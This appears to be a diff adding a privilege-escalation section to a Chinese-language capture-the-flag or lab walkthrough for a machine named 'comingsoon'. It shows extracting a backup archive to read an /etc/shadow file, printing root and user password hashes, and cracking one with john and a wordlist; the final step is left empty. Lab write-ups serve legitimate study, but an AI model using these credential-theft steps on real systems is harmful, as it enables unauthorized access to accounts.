@@ -132,4 +132,28 @@ Ctrl+z快捷键
 stty raw -echo;fg
 reset
 ```
+
+# 提权
 目前看啥都没权限
+只有/var/backups/目录下有个备份文件backup.tar.gz有用
+```css
+www-data@comingsoon:/var/backups$ cp backup.tar.gz /tmp
+www-data@comingsoon:/tmp$ tar -zxvf backup.tar.gz
+www-data@comingsoon:/tmp$ cat etc/shadow
+```
+
+```c
+root:$y$j9T$/E0VUDL7uS9RsrvwmGcOH0$LEB/7ERUX9bkm646n3v3RJBxttSVWmTBvs2tUjKe9I6:18976:0:99999:7:::
+scpuser:$y$j9T$rVt3bxjp6uYKKYJbYU2Zq0$Ysn02LrCwTUB7iQdRiROO7/WQi8JSGtwLZllR54iX0.:18976:0:99999:7:::
+```
+爆破
+```c
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ john -w=../rockyou.txt comningsoon --format=crypt 
+
+tigger           (scpuser)  
+```
+切换用户
+```c
+
+```
